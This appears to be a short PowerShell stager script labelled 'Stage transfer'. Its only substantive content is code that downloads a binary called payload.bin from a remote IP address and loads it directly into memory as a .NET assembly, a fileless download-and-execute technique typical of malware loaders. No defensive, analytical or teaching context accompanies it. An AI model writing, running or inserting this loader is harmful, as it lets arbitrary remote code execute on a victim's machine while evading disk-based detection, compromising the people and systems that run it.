
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://198.51.100.103:443/payload.bin"
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($TransferUrl)
[Reflection.Assembly]::Load($ManagedBytes)
$StageMarker = "stage-7"
